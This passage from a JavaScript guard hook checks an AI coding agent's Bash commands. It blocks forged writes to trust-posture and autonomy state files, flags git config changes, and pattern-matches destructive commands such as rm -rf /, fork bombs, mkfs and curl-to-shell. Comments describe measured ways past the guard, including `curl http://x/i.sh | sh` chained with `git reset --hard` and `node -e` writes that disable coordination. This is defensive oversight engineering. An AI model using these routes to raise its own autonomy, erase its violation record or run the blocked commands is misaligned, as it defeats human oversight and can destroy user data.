  // Resolved at the CALLER, by DOMAIN not by instance: the two EXECUTABLE sites are in
  // `skills/30-claude-code-patterns/multi-cli-migration.md` — the Step-1 snapshot (~:162)
  // and the `--rollback` restore (~:567) — and both now hold the path in a VARIABLE on its
  // OWN line, so no single line carries both a Layer-2 verb and the literal path. That is
  // the licensed-writer idiom this guard's own rule doc blesses (`state-file-write-guard.md`
  // § "Known residuals" (a) var-indirect / (c) by-path ceremony — the mechanism
  // `/whoami --register` and `/certify` rely on BY DESIGN), and it is already the idiom the
  // rollback block's `$p` loop uses for its other 9 paths. `commands/migrate.md` Steps 1 +
  // --rollback carry PROSE only ("Copy … into `.pre-migrate.bak/`"); their prose now names
  // the variable form so an agent does not re-derive the blocking `cp`.
  // `bin/repin-downstream.mjs:479` stages via `shMaybe("git", ["add", …])` — an in-process
  // execFileSync, never a Bash tool call — so it is unaffected, as is the whole hook-writer
  // class (`version-utils.js` SessionStart auto-create ~:308 + type auto-correct ~:519).
  // All 13 adversarial write vectors (redirect/append/force-clobber/tee/sed -i/jq -i/
  // heredoc/rm/mv/truncate/node -e/python -c/perl -e) newly FLAG.
  //
  // NOT added to reconcile-settings-deny.mjs::CANONICAL_STATE_DENY — DELIBERATE, see the
  // § "#1399 — why VERSION is NOT in this list" block there. Unlike every entry in that
  // list, `.claude/VERSION` has TWO Edit/Write-TOOL writers on documented HAPPY paths
  // (`/sync-from-template` Step 6, which runs at every downstream consumer on every
  // pull and is dispositive alone; and `/migrate` Step 2), plus one on a HALT path
  // (`/codify` Step 7c's operator-facing self-service fix — listed for completeness,
  // not load-bearing). A flat `Edit()` deny would break the happy-path two — the same
  // reason settings.json's own L1 blanket deny is omitted. Exact verbatim citations
  // live at the declining site; do not re-derive them from memory.
  // The Bash lane (here) is the half that closes with no legitimate casualty.
  // CASE-INSENSITIVE (`i`) IS LOAD-BEARING, NOT COSMETIC — and the same flag is
  // required on LAYER3_BLOCK_RX and COORD_MODE_RX below (all three are independent
  // path matchers over the same protected-state concept; a new fail-closed dimension
  // MUST land at EVERY surface in the same change per security.md § Enforcement-Surface
  // Parity — fixing only this one would leave the Layer-3 block-set and the
  // coordination-mode fence still defeatable by the identical form).
  //
  // On a case-INSENSITIVE filesystem (APFS default on macOS — the default dev
  // platform for this corpus) `.claude/version` and `.claude/VERSION` are THE SAME
  // FILE, so a case-SENSITIVE matcher is defeated by a one-character change.
  // MEASURED against the real hook before this fix, canonical vs case-variant
  // (exit 2 = blocked, 0 = passed):
  //
  //     VERSION           canonical=2  variant=0     settings.json     canonical=2  variant=0
  //     posture.json      canonical=2  variant=0     violations.jsonl  canonical=2  variant=0
  //     operators.roster  canonical=2  variant=0     .CLAUDE/ dir-case canonical=2  variant=0
  //
  // 6/6 canonical controls blocked (anti-vacuity), 6/6 variants passed. FOUR of these
  // (settings/posture/violations/roster) reproduce on origin/main @ 91453fe2 and are
  // therefore PRE-EXISTING, not introduced by #1399 — owned here regardless per
  // zero-tolerance.md Rule 1a (a finding on a PR scan is treated identically to one on
  // a main scan; "same on main" is NOT a deferral). The forged writes this re-closes are
  // the ones this file's own § SCOPE calls non-fold-derived: a forged posture.json is a
  // trusted L5 grant, a wiped violations.jsonl evades cumulative downgrade.
  //
  // FALSE-POSITIVE COST, MEASURED not assumed — scope `.claude/**/*.md` at this commit,
  // as (count / distinct files): `.claude/VERSION` 97/24 and `.claude/settings.json`
  // 63/28 (canonical, already matched today) vs `.claude/version` 0/0, settings
  // case-variants 0/0, `.claude/` dir case-variants 0/0. The `i` flag therefore adds
  // ZERO new prose matches across the corpus — it does not widen the residual (l)
  // over-block that already blocked four independent actors verifying this guard.
  //
  // On a case-SENSITIVE filesystem (Linux CI) `.claude/version` IS a distinct file, so
  // there the flag is a pure (measured-zero) over-block rather than a fix. That
  // asymmetry is accepted deliberately: this hook SYNCS to consumers on mixed
  // platforms, and a guard whose protection depends on the host filesystem is worse
  // than one that over-blocks a path nobody writes.
  // STATE_PATH_RX is BUILT from the registry (see the module-scope require).
  // Its rows carry `surfaces.bash: true`; #1409's redundant-separator token and
  // the `i` flag are properties of the builder, so both apply to every surface
  // at once rather than needing three hand-edits.
  // loom#1703 — the boundary roots the containment test resolves against. BOTH
  // the session's own toplevel AND the main checkout are included, so a linked
  // worktree does not accidentally exempt the repo it belongs to (and vice
  // versa). `resolveMainCheckout` is the same resolver the rest of this hook
  // already uses. Any failure leaves the list SHORT, which is fail-closed: the
  // oracle then falls back to its is-there-a-`.git`-above test, and anything it
  // still cannot attribute returns "unresolved" → the block is retained.
  const stateScopeRoots = [];
  if (cwd) stateScopeRoots.push(cwd);
  try {
    const mainCheckout = resolveMainCheckout(cwd);
    if (mainCheckout) stateScopeRoots.push(mainCheckout);
  } catch {}
  const stateTargetScope = createStateTargetScope({
    cwd,
    boundaryRoots: stateScopeRoots,
    command,
  });
  const stateFileMutation = detectStateFileMutationSegmentAware(
    command,
    STATE_PATH_RX,
    { scope: stateTargetScope },
  );
  if (stateFileMutation) {
    try {
      logLearningObservation(cwd, "rule_violation", {
        rule: "trust-posture/state-file-mutation",
        layer: stateFileMutation.layer,
      });
    } catch {}
    // #1293 (co-owner-ratified 2026-07-22, disposition "Option X" after the
    // security redteam refuted the initial broad carve-out): Layer 3 (a lexical
    // interpreter -c/-e/-m body scan) is DEMOTED to halt-and-report ONLY for state
    // whose forged write is genuinely NEUTRALIZED downstream WITHOUT relying on a
    // fold that may not run:
    //   - observations.jsonl — self-PROMOTION from a forged positive observation
    //     is AND-gated on the human challenge-nonce (trust-posture.md MUST-5), and
    //     a WIPE only harms the agent's OWN upgrade eligibility (self-harm, not
    //     escalation); this is the actual #1293 false-positive path (Class 2).
    //   - .heartbeat-cache / .session-end-cache — ephemeral, no autonomy grant.
    // Everything else in STATE_PATH_RX KEEPS severity:block at Layer 3 via
    // LAYER3_BLOCK_RX. The critical reason (security redteam): the severity router
    // does NOT (and MUST NOT be assumed to) run on a coordination-ENABLED repo —
    // coordination is OFF by DEFAULT on most downstream consumers of this synced
    // guard, and on an OFF repo there is NO coordination log and NO fold. So the
    // "re-derived away by the signed fold" defense is UNAVAILABLE there, and:
    //   - posture.json (+.bak/.tmp) is the primary autonomy grant with NO
    //     signature check at read (state-io.js::readPosture) — a schema-valid
    //     forged L5 would be trusted verbatim (autonomy escalation);
    //   - .initialized gates fresh-repo-vs-corrupt — deleting it + posture.json
    //     yields a fresh-repo L5 reset (trust-posture.md MUST-2 / CRIT-4);
    //   - violations.jsonl is the cumulative-downgrade counter — a wipe evades it;
    //   - presence-mechanism.json is a standalone provisioning contract (see the
    //     block rationale ~L452), not fold-derived;
    //   - operators.roster.* / coordination-log.jsonl are committed / append-
    //     authority sources (2-of-N quorum PR / signed hash-chain).
    //   - settings.json (#1309) is the file-tool DENY CONTRACT protecting every
    //     path above; a forged strip of its permissions.deny on an OFF repo is
    //     re-derived by NO fold — the L3 drift-guard self-heals at the NEXT
    //     session-start, not at the write, so an interpreter-body strip STANDS
    //     until then (an autonomy/security downgrade), so it keeps block.
    //   - VERSION (#1399) is the repo-CLASS root of trust: readRepoClass trusts
    //     `type` VERBATIM (no signature, no cross-check) and NOTHING re-derives the
    //     file, on an ON repo or an OFF one — so a forged class STANDS and silently
    //     no-ops Validator 15 entirely, Validator 17's half B, and V16's presence
    //     classifier. Same non-fold-derived disposition as posture.json, and the
    //     failure is SILENT-GREEN rather than loud, which is what earns block here.
    // None of these are re-derived away on an OFF repo, so their Layer-3 forgery
    // would STAND — they keep block. Prose-mentions of these paths are rare (the
    // #1292 gh/echo/printf mask already handles the doc-wrapper case), so the FP
    // cost of keeping block is ~0. Layers 1/2/4 are structural command-shape
    // signals → always block. NOTE (hook-output-discipline.md MUST-2): a Layer-3
    // block IS a lexical signal; keeping it for LAYER3_BLOCK_RX is a DELIBERATE,
    // ratified, fail-closed defense-in-depth deviation (over-blocks a rare real
    // write, never under-blocks) — documented in state-file-write-guard.md
    // § "Severity by layer".
    // LAYER3_BLOCK_RX is BUILT from the registry rows carrying
    // `surfaces.layer3: true` — the subset whose forged write is NOT re-derived
    // away by a fold. It was "surface 2 of 3" for the case-insensitivity
    // dimension; there is now ONE surface to teach.
    // loom#1703 — HONESTY SPLIT. Pre-#1703 every Layer-1/2 hit was announced as
    // "a structurally-unambiguous mutation", which was TRUE for a redirect onto
    // the live path and FALSE for the two documented over-blocks: the decision
    // was keyed on token presence near a verb, i.e. lexical. Now the detector
    // reports HOW it decided, and the message says which:
    //
    //   scope === "in-tree"     the target was RESOLVED (candidate and boundary
    //                           root both canonicalized) and lands in protected
    //                           state. "Structurally unambiguous" is now earned.
    //   scope === "unresolved"  the target could NOT be resolved — a `$VAR` the
    //                           command assigns, a glob, a `$(…)`. Still BLOCKED
    //                           (fail closed), but announced as an unresolved
    //                           lexical match, naming what actually matched, per
    //                           `hook-output-discipline.md` MUST-2.
    const isResolvedInTree = stateFileMutation.scope === SCOPE.IN_TREE;
    const isStructural =
      (stateFileMutation.layer === 1 || stateFileMutation.layer === 2) &&
      isResolvedInTree;
    const isUnresolvedShellOp =
      (stateFileMutation.layer === 1 || stateFileMutation.layer === 2) &&
      !isResolvedInTree;
    // loom#1681 — the SEVERITY ROUTER is a third protected-path spelling test,
    // independent of the detector's own. Left on a bare `.test` it read FALSE for
    // every traversal spelling, silently routing a Layer-3 interpreter write to
    // the #1293 Option-X ADVISORY tail instead of blocking — a severity fail-open
    // sitting behind the very fix that made the detector fire. It routes through
    // the same shared predicate (`security.md` § Enforcement-Surface Parity).
    // V3 — this router previously used the bare `pathSpellingHit`, a pure
    // `pathRx.test(view)` with NO resolution, so the `severity: "block"` below
    // rested on a lexical match: the class `hook-output-discipline.md` MUST-2
    // forbids. `scopedPathHit`'s own doc says it in terms — on "unresolved" the
    // caller "MUST NOT claim a structural match".
    //
    // The three verdicts are routed to the TWO dispositions this file already
    // draws for Layers 1-2 immediately above, rather than a new vocabulary:
    //   "in-tree"    a token RESOLVES into protected state  -> STRUCTURAL block
    //   "unresolved" a token is present and the resolver could not place it
    //                -> FAIL CLOSED, block, but NOT called structural
    //   null         absent, or every token resolved elsewhere -> no block
    //
    // Blocking on "unresolved" is not a MUST-2 violation and the distinction is
    // the whole point: the claim is not "a regex matched", it is "a protected
    // token is present AND resolution FAILED". The second conjunct is a
    // structural fact about the resolver's attempt — the same class as an
    // INDETERMINATE target verdict — and MUST-2 exists to stop false positives
    // from surface rewrites, whereas fail-closed-on-unverifiable is the opposite
    // posture and announces itself as such. `isUnresolvedShellOp` directly above
    // already takes exactly this disposition for Layers 1-2.
    const layer3Path =
      stateFileMutation.layer === 3
        ? scopedPathHit(command, LAYER3_BLOCK_RX, stateTargetScope)
        : null;
    const isLayer3BlockPath = layer3Path === "in-tree";
    const isLayer3Unresolved = layer3Path === "unresolved";
    if (
      isStructural ||
      isUnresolvedShellOp ||
      isLayer3BlockPath ||
      isLayer3Unresolved
    ) {
      return withDeferred({
        severity: "block",
        what_happened: isStructural
          ? `Bash command attempts to mutate trust-posture state file (Layer ${stateFileMutation.layer}: ${stateFileMutation.kind}): ${command.slice(0, 120)}`
          : isUnresolvedShellOp
            ? `Bash command carries a redirect/file-util verb on a protected-state path that the hook could NOT RESOLVE (Layer ${stateFileMutation.layer}: ${stateFileMutation.kind}): ${command.slice(0, 120)}`
            : `Bash command attempts to mutate trust-posture state file — an interpreter-body write to non-fold-derived autonomy/authority state (posture/.initialized/presence/violations/roster/coordination-log/settings.json/VERSION) (Layer 3: ${stateFileMutation.kind}): ${command.slice(0, 120)}`,
        why: isStructural
          ? "trust-posture/state-file-mutation — a redirect/file-util verb whose RESOLVED target lands inside this repo's protected state (posture.json, violations.jsonl, coordination-log.jsonl, .initialized, settings.json, roster, VERSION, .git). Candidate and boundary root were BOTH canonicalized before the comparison (security.md § Path Containment), so this is a structurally-unambiguous mutation, not a name match: a symlink pointing into the live tree resolves here too. State files are owned by hooks and agent edits are BLOCKED"
          : isUnresolvedShellOp
            ? 'trust-posture/state-file-mutation — HONEST STATEMENT OF WHAT MATCHED (hook-output-discipline.md MUST-2): this is NOT a resolved containment hit. What matched is LEXICAL — a redirect or file-util verb next to a token SPELLED like a protected state path, where the token could not be resolved to a real location. The usual causes are a shell variable the command itself assigns (`T=$(mktemp -d); … > "$T/.claude/learning/posture.json"`), a glob metacharacter, or a `$(…)` substitution — the hook does not expand shell syntax (MUST-3), so it cannot tell a sandbox path from the live file here. It FAILS CLOSED and blocks. If the target is genuinely a throwaway sandbox, re-issue it with the directory spelled LITERALLY (`> /var/folders/…/tmp.XYZ/.claude/learning/posture.json`) and it will resolve out-of-tree and pass'
            : "trust-posture/state-file-mutation — this path is NOT re-derived away by the signed fold (coordination is OFF by default downstream, so no fold runs): a forged posture.json is a trusted L5 grant, deleting .initialized resets to fresh-repo L5, wiping violations.jsonl evades cumulative downgrade, presence-mechanism.json is a standalone provisioning contract, roster/coordination-log are committed/append-authority, settings.json is the file-tool deny CONTRACT protecting all of them (#1309), and .claude/VERSION is the repo-CLASS root of trust whose `type` readRepoClass trusts verbatim — a forged class silently no-ops Validator 15, Validator 17's half B, and V16's presence classifier while printing green (#1399). An interpreter-body WRITE to any of them stays BLOCKED at the Bash boundary (#1293 Option X; #635 guarantee)",
        agent_must_report: [
          "Quote the exact bash command that was attempted",
          "State whether you intended to read, debug, or modify the state",
          isStructural
            ? "If reading: use `cat` (allowed); if modifying: use /posture command instead"
            : isUnresolvedShellOp
              ? "State which DIRECTORY the target actually lands in. If it is a throwaway sandbox, re-issue the command with that directory spelled LITERALLY instead of behind a variable/glob — the guard resolves literal paths and lets out-of-tree ones through. If it is the live state file, stop and use /posture."
              : "If reading: use `cat`, or an interpreter body with NO write token (a read-only `-e`/`-c` body passes the #1292 gate — this is how /codify Step 6b filters the violation records). NOTE: a SHELL-OUT from inside the interpreter body counts as a write token — `execSync` / `child_process` / `subprocess.*` / `os.system` / `spawn`(`Sync`) / `Popen` / ruby-perl `%x{}` / `qx{}` all match, because the scanner cannot analyse the inner command and so must rank it write. Fetch the shell value OUTSIDE the interpreter body and pass it in via env or argv. Posture routes through /posture, roster through /whoami --register, coordination-log through the canonical signed-append ceremony — never an inline interpreter write",
          // #1363: the WRITING-ABOUT-state-files case. A protected path quoted in
          // human prose is masked (quote-aware, every prose carrier), but a body
          // that genuinely EXECUTES — a live backtick or `$(…)` inside DOUBLE
          // quotes — still fires, correctly, because the shell would run it. The
          // fix is a quoting change, and it is not discoverable from a `cat`
          // suggestion, so name it explicitly.
          "If this command only DESCRIBES a state file (an issue body, PR description, commit message, release note): single-quote the body so markdown backticks stay literal, or pass it via `--body-file` / `-F <file>`; author a scratch file with the Write tool rather than a Bash heredoc",
        ],
        agent_must_wait:
          "Do not retry the same form. State-file mutations route through the canonical ceremony (challenge-nonce / quorum / signed-append gated), never directly. If the command was PROSE about a state file rather than a mutation, re-issue it in the quoted/`--body-file` form above rather than re-running it verbatim.",
        user_summary: `state-file mutation blocked (Layer ${stateFileMutation.layer}${isStructural ? ", resolved in-tree" : isUnresolvedShellOp ? ", target UNRESOLVED — lexical match, failed closed" : ", non-fold-derived"})`,
      });
    }
    // Layer 3 on a genuinely-bounded path (observations.jsonl / ephemeral caches)
    // — advisory (non-blocking): lexical body scan, and the forgery is neutralized
    // WITHOUT relying on a fold (nonce-gated promotion / self-harm-only wipe).
    //
    // loom#1606 instance 6 — DEFER, never return. This is the ADVISORY arm of
    // the state-file lane (the Layer-1/2/3-block arm above returns and is
    // terminal). Returning here short-circuited both irrecoverable git fences.
    // MEASURED with a control on a tree carrying untracked files:
    //   git clean -fd                                    (alone)  -> exit 2 BLOCK
    //   node -e "…appendFileSync('…/observations.jsonl',…)" && <same> -> exit 0 ALLOW
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened: `Bash command references a bounded trust-posture state file inside an interpreter body (Layer 3: ${stateFileMutation.kind}): ${command.slice(0, 120)}`,
      why: "trust-posture/state-file-mutation (Layer 3 on a bounded path — observations.jsonl / .heartbeat-cache / .session-end-cache — advisory per #1293 Option X + hook-output-discipline.md MUST-2) — a lexical scan of an interpreter -c/-e/-m body cannot tell an executed write from a read-only body or a write-example quoted as documentation, so block-severity here is the recurring false-positive class. This surfaces as advisory because the forgery is neutralized WITHOUT a fold: a forged positive observation cannot self-upgrade (challenge-nonce gated) and a wipe only harms the agent's own upgrade eligibility. Autonomy/authority state (posture, .initialized, presence, violations, roster, coordination-log) stays BLOCKED.",
      agent_must_report: [
        "Quote the exact bash command that was flagged",
        "Confirm whether it WRITES observations.jsonl / a cache file, or merely reads / quotes one as an example",
        "If it writes state directly: stop (positive observations are earned, not written); if it reads or quotes an example: proceed",
      ],
      agent_must_wait:
        "Advisory only — the command was NOT blocked. A forged positive observation cannot upgrade posture (challenge-nonce gated); do not rely on hand-written state.",
      user_summary: `state-file bounded interpreter-body reference flagged (Layer 3, advisory)`,
    });
  }

  // HALT-AND-REPORT: `git config` write to a security-load-bearing key of THIS
  // repository's own config (loom#1470 defeat 2).
  //
  // This sits beside the STATE_PATH_RX lane above because it closes that lane's
  // one structural blind spot rather than extending it. Every git-derived
  // security property in this repo — the #1441 commit attestation, the #1462
  // repo-family jurisdiction primitive, the #1464 subprocess-env allowlist —
  // reads its answer from git, and `git config core.repositoryformatversion 99`
  // mutates the file all of them rest on WITHOUT the string `.git/config`
  // appearing anywhere in the command. A path matcher cannot see it, so no
  // registry row could have carried this; and the write goes AROUND the #1464
  // env allowlist rather than through it (a repository's own config is always
  // read and has no off switch), so no env fix reaches it either.
  //
  // SEVERITY IS CAPPED AT halt-and-report, DELIBERATELY (hook-output-discipline
  // .md MUST-2): this is a LEXICAL regex over a command string, not a
  // structural command-shape signal. The ratified Layer-1/2 `block` deviation
  // recorded in state-file-write-guard.md § "Severity by layer" is scoped to
  // the PATH lane and is NOT extended here — a lexical scan cannot distinguish
  // an executed write from one quoted inside a construct it mis-parsed, which
  // is exactly the false-positive class #1363 documented.
  const gitConfigMutation = detectGitConfigMutation(command);
  if (gitConfigMutation) {
    try {
      logLearningObservation(cwd, "rule_violation", {
        rule: "trust-posture/git-config-mutation",
        key: gitConfigMutation.key,
      });
    } catch {}
    // loom#1606 instance 7 — DEFER, never return. Returning this advisory
    // short-circuited both irrecoverable git fences below, so the very command
    // shape that repoints `core.hooksPath` could carry a destructive op past
    // them in the same chain. MEASURED with a control on a dirty tree:
    //   git reset --hard HEAD                  (alone)  -> exit 2 BLOCK
    //   git config core.hooksPath /tmp/x && <same>      -> exit 0 ALLOW
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened: `Bash command writes a security-load-bearing key of this repository's own git config (${gitConfigMutation.kind}): ${command.slice(0, 120)}`,
      why: "loom#1470 defeat 2 — `.git/config` is the file every git-derived security property in this repo reads its answer from (commit attestation, repo-family jurisdiction, the subprocess-env allowlist). The fenced keys are the ones that carry authority rather than ergonomics: `core.repositoryformatversion` makes every git command in the repo refuse; `core.worktree`/`core.bare` repoint the working tree every path-scoped fence resolves against; `core.hooksPath`/`core.fsmonitor`/`core.sshCommand` each name a program git EXECUTES during ordinary operations; `include.path`/`includeIf.*.path` pull an attacker-chosen config file in and re-open all of the above indirectly; `extensions.*` is repository-format state. `GIT_CONFIG_NOSYSTEM` and `GIT_CONFIG_GLOBAL=/dev/null` cannot neutralise any of it — a repository's OWN config is always read — so the Bash boundary is the only place this is visible before it runs. Advisory per hook-output-discipline.md MUST-2: this is a lexical command-string match, so it reports rather than blocks.",
      agent_must_report: [
        "Quote the exact bash command that was flagged",
        `State why this session needs to write \`${gitConfigMutation.key}\` rather than read it (\`git config --get ${gitConfigMutation.key}\` is not flagged)`,
        "Confirm the write is operator-intended repository setup, not a step that widens what a later gate will accept",
      ],
      agent_must_wait:
        "Advisory only — the command was NOT blocked. Reads of these keys pass unflagged; `--global`/`--system` writes are out of scope by construction, and `git -c key=value <cmd>` is a per-invocation override that persists nothing. If you need a per-command setting, prefer that form over a persistent write.",
      user_summary: `git config write to ${gitConfigMutation.key} flagged (advisory)`,
    });
  }

  // BLOCK (conditional): coordination-mode.json Bash mutation on an ENROLLED repo.
  //
  // #761 (reviewer LOW-1, PR #758 redteam): coordination-mode.json is the opt-in
  // override. integrity-guard.js watches it in DIRECT (Edit/Write layer), but this
  // Bash guard did not — so on an enrolled repo a
  // `node -e "fs.writeFileSync('.claude/learning/coordination-mode.json','{\"enabled\":false}')"`
  // bypassed the Bash layer and could silently flip the substrate off.
  //
  // UNLIKE roster.schema.json above, a FLAT STATE_PATH_RX add here would OVER-BLOCK
  // a solo consumer's own Bash-lane write to coordination-mode.json (their opt-in
  // escape hatch). So THIS Bash guard is enrolled-vs-solo asymmetric, mirroring
  // integrity-guard's W1-b: block the Bash mutation ONLY when the repo is ENROLLED;
  // on a never-enrolled repo this guard passes through (it does not block the Bash
  // write). SCOPE NOTE: "passes through" is about
  // THIS Bash lane only — the Edit/Write file-tool lane is governed by integrity-guard's
  // DIRECT set (which is ITSELF enrolled-vs-solo asymmetric: it passes through on a
  // solo/OFF repo and blocks off-codify Edit/Write only when enrolled). #762 (2026-07-02,
  // option a) DROPPED coordination-mode.json from settings.json permissions.deny precisely
  // so the file-tool lane matches this Bash guard's conditional model: on a solo repo the
  // consumer may Edit/Write their opt-in escape hatch freely (integrity-guard passthrough,
  // no settings deny); on an enrolled repo integrity-guard's DIRECT set blocks the
  // off-codify write. Both lanes are now solo-writable / enrolled-gated — no unconditional
  // file-tool deny remains.
  //
  // The enrolled block here is DEFENSE-IN-DEPTH, not the load-bearing fence: even if a
  // `{enabled:false}` Bash write LANDS on an enrolled repo, the substrate stays ON
  // because coordination-mode.js's asymmetric-precedence predicate (_refuseLocalDisable)
  // REFUSES to honor a local {enabled:false} on an enrolled repo at resolution time.
  // This Bash guard just stops the write from landing at all. That is why fail-OPEN on
  // a resolution error is acceptable: the real fence (the precedence refusal) plus the
  // Edit/Write DIRECT-set fence both remain. We wrap the predicate in try/catch
  // defensively — integrity-guard asserts it "never throws" and calls it bare, but this
  // belt-and-suspenders Bash layer fails open regardless, so a future throw degrades
  // only this DEPTH layer, never the primary controls.
  //
  // ---- PREDICATE: GOVERNANCE, NOT COORDINATION (loom#1896 follow-up) ----
  // This gate is keyed on `isGovernanceEnabled`, and the paragraphs above are the
  // argument for why: every one of them says ENROLLED. So do the block message, the
  // `why`, and the `user_summary` below. The check has always been about whether
  // somebody established a trust root here — never about how many humans are bound.
  //
  // Until loom#1890 those were the same predicate, so `isCoordinationEnabled` read
  // correctly by accident. #1890 added a ≥2-distinct-humans floor to tier 4 — right
  // for sibling claims and the quorum, which are facts about OTHER HUMANS — and this
  // fence silently inherited it. Net effect on canon loom, ENROLLED with one human
  // bound: an agent could `node -e` a `{"enabled":false}` straight into
  // coordination-mode.json, which is exactly the bypass #761 closed. The threat model
  // here is an AGENT disabling the substrate mid-session; the roster's human count is
  // not evidence about it.
  //
  // COST: unchanged. `isGovernanceEnabled` reads the already-cached coordination
  // verdict and, on the explicit-disable arm only, one roster JSON. It never folds the
  // coordination log and never spawns gpg, so this hot Bash path pays nothing new.
  let governanceOn = false;
  try {
    const mainCwd = resolveMainCheckout(cwd) || cwd;
    governanceOn = isGovernanceEnabled(mainCwd) === true;
  } catch {
    governanceOn = false; // fail-open (aligned with integrity-guard passthrough)
  }
  if (governanceOn) {
    // COORD_MODE_RX is BUILT from the registry row carrying
    // `surfaces.coordMode: true` — its own surface precisely because a FLAT add
    // to STATE_PATH_RX would over-block a solo consumer's opt-in escape hatch.
    // `scope` is REQUIRED for the verdict to be structural: with no third
    // argument the predicate collapses to a flat `pathRx.test(text)`
    // (`lib/violation-patterns.js:3899`), and a `severity: "block"` resting on
    // a bare lexical match is what `hook-output-discipline.md` MUST-2 forbids.
    // Same `stateTargetScope` the sibling call at `:1203` passes; it is built
    // from the COMMAND, not from a matcher, so it is reusable unchanged.
    const coordMutation = detectStateFileMutationSegmentAware(
      command,
      COORD_MODE_RX,
      { scope: stateTargetScope },
    );
    if (coordMutation) {
      try {
        logLearningObservation(cwd, "rule_violation", {
          rule: "multi-operator-coordination/coordination-mode-bash-mutation",
          layer: coordMutation.layer,
        });
      } catch {}
      return withDeferred({
        severity: "block",
        what_happened: `Bash command attempts to mutate the coordination opt-in override on an ENROLLED repo (Layer ${coordMutation.layer}: ${coordMutation.kind}): ${command.slice(0, 120)}`,
        why: "multi-operator-coordination/coordination-mode — on an enrolled repo, .claude/learning/coordination-mode.json is owned by the /codify flow (integrity-guard DIRECT set); a Bash write off-codify could silently disable the substrate. Bash-layer parity with integrity-guard's Edit/Write coverage (#761). Never-enrolled repos are unaffected (this branch fires only on an ENROLLED repo — a single-human roster is still enrolled, so it still fences the agent).",
        agent_must_report: [
          "Quote the exact bash command that was attempted",
          "State whether you intended to read, debug, or change the coordination mode",
          "If reading: use `cat` (allowed); if changing: coordination-mode is a /codify-flow (codify-branch + lease) edit on an enrolled repo, never a direct Bash write",
        ],
        agent_must_wait:
          "Do not retry. On an enrolled repo, coordination-mode changes route through the /codify flow (integrity-guard codify-branch + covering lease), never a direct Bash write.",
        user_summary: `coordination-mode Bash mutation blocked on enrolled repo (Layer ${coordMutation.layer})`,
      });
    }
  }

  // BLOCK: Dangerous commands (with evasion-resistant patterns)
  const dangerousPatterns = [
    {
      // \b anchors rm to a command/path boundary so a word ENDING in "rm"
      // (confiRM, perfoRM, platfoRM, aRM) followed by " /" no longer matches.
      // `/` is a non-word char, so \b still fires for path-qualified `/bin/rm /`.
      pattern: /\brm\s+(-[rRf]+\s+)*\/($|\s|\*)/,
      message: "Blocked: rm on root filesystem",
    },
    {
      pattern: /\brm\s+--(?:recursive|force)\b/,
      message: "Blocked: rm recursive/force with long flags",
    },
    { pattern: />\s*\/dev\/sd/, message: "Blocked: Writing to block device" },
    { pattern: /mkfs\./, message: "Blocked: Filesystem formatting" },
    { pattern: /dd\s+if=.*of=\/dev\/sd/, message: "Blocked: dd to disk" },
    { pattern: /:\(\)\{\s*:\|:&\s*\};:/, message: "Blocked: Fork bomb" },
    {
      // The function-name capture is BOUNDED (`\w{1,64}`, not `\w+`) to prevent
      // catastrophic backtracking: an unbounded `\w+` followed by a required
      // `()` grinds O(n²) on a long word-char run with no `()` (a `perl
      // -eeee…<path>` adversarial input ran ~7s → hook timeout). A real
      // fork-bomb function name is a short shell identifier; 64 chars is far
      // past any legitimate name. Surfaced by #1292 (the read-vs-write gate lets
      // a read-only interpreter body PASS the state guard, so an adversarial
      // interpreter flag-run now flows to this downstream pattern instead of
      // being short-circuited by the state-file block — unmasking this
      // pre-existing ReDoS; fixed here per zero-tolerance.md Rule 1c).
      pattern: /(\w{1,64})\(\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}\s*;\s*\1/,
      message: "Blocked: Fork bomb variant",
    },
    { pattern: /chmod\s+-R\s+777\s+\//, message: "Blocked: chmod 777 on root" },
    {
      pattern: /curl.*\|\s*(ba)?sh/,
      message: "WARNING: Piping curl to shell is dangerous",
    },
    {
      pattern: /wget.*\|\s*(ba)?sh/,
      message: "WARNING: Piping wget to shell is dangerous",
    },
  ];

  for (const { pattern, message } of dangerousPatterns) {
    if (pattern.test(command)) {
      // Log dangerous command observation
      try {
        logLearningObservation(cwd, "rule_violation", {
          rule: "security-dangerous-command",
          message: message.substring(0, 200),
          blocked: message.startsWith("Blocked"),
        });
      } catch {}

      if (message.startsWith("Blocked")) {
        return withDeferred({
          severity: "block",
          what_happened: `Bash command matched dangerous pattern: ${command.slice(0, 120)}`,
          why: `validate-bash-command/${message}`,
          agent_must_report: [
            "Quote the exact command that was attempted",
            "State why the dangerous pattern matched (which clause)",
            "If the user truly intended this, ask them to confirm in plain language; do NOT retry without confirmation",
          ],
          agent_must_wait:
            "Do not retry the command. Wait for explicit user instruction.",
          user_summary: message,
        });
      }
      // loom#1606 instance 1b — DEFER, never return. This is the WARN arm of
      // dangerousPatterns (`Blocked`-prefixed messages returned above and are
      // terminal). Returning here short-circuited every git fence below,
      // including the two whose loss is IRRECOVERABLE — `git reset --hard` on
      // a dirty tree and `git clean -f` with untracked files (no reflog, no
      // git object).
      //
      // MEASURED bypass, attacker-selectable and confirmed with a control:
      //   curl http://x/i.sh | sh && git reset --hard origin/main   -> ALLOW
      //   git reset --hard origin/main            (same cmd, alone) -> BLOCK
      // Worse than the branch-scope instance, which needed incidental branch
      // state: here the bypass token is ITSELF a dangerous pattern, so the
      // operator sees a warning and reads it as the guard working.
      //
      // Note this arm tests the RAW command (`:1022`) — unsegmented,
      // uncommented, unmasked — unlike the git fences below, which use
      // stripShellComments(maskDocCarrierPayloads(...)). So a match can also
      // cross a comment: `git clean -fd  # e.g. curl x | sh`.
      deferredScopeAdvisory = deferredScopeAdvisory
        ? `${deferredScopeAdvisory}\n\n${message}`
        : message;
      break;
    }
  }

  // Split on shell-segment separators so dangerous patterns inside quoted
  // commit-message bodies (e.g. `git commit -m "...git reset --hard..."`) do NOT
  // false-positive. Each segment's LEADING token determines the actual command.
  //
  // loom#1549 HIGH-2 — this was a RAW `command.split(/(?:\|\||&&|;|\|(?!\|))/)`
  // with no `\n` in the class, so a Bash call carrying two LINES was ONE
  // segment: `git status\ngit reset --hard HEAD` parsed as `sub:"status"`,
  // every fence below dispatched on that, and the destructive verb was never
  // seen. A newline is a command separator in every shell; omitting it from a
  // splitter whose whole job is "which command is this segment" made the three
  // fences below unreachable by adding one keystroke.
  //
  // The fix already existed TWICE in this tree and had not reached these lanes:
  // `parseGitInvocations` passes `newlineSeparates: true`, and so does the
  // worktree lane below.
  //
  // Comments are stripped BEFORE splitting, matching what `parseGitInvocations`
  // does with `cleaned`. Without it the splitter still fractures on a `;` inside
